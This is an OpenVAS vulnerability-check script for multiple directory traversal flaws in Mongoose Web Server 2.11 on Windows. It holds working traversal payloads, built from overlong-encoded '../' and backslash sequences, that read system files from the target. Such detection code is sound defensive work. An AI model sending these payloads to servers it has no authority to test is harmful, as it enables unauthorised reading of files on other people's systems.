###############################################################################
# OpenVAS Vulnerability Test
#
# Mongoose Web Server Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801533");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2010-11-02 18:01:36 +0100 (Tue, 02 Nov 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Mongoose Web Server Multiple Directory Traversal Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_require_keys("Host/runs_windows");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15373/");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"Mongoose Web Server version 2.11 on Windows.");

  script_tag(name:"insight", value:"The flaws are due to an error in validating backslashes in
  the filenames.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running Mongoose Web Server and is prone to multiple
  directory traversal vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("host_details.inc");

port = http_get_port(default:80);
banner = http_get_remote_headers(port:port);
if(!banner || "Server:" >< banner)
  exit(0);

files = traversal_files("windows");
exploits = make_array();

foreach pattern(keys(files)) {

  file = files[pattern];
  exploits["/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/" + file] = pattern;
  file = str_replace(find:"/", string:file, replace:"\");
  exploits["/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\" + file] = pattern;
  file = str_replace(find:"\", string:file, replace:"%5c");
  exploits["/%c0%2e%c0%2e%5c%c0%2e%c0%2e%5c%c0%2e%c0%2e%5c" + file] = pattern;
  file = str_replace(find:"%5c", string:file, replace:"%c0%5c");
  exploits["/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c" + file] = pattern;
}

foreach url(keys(exploits)) {

  pattern = exploits[url];

  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);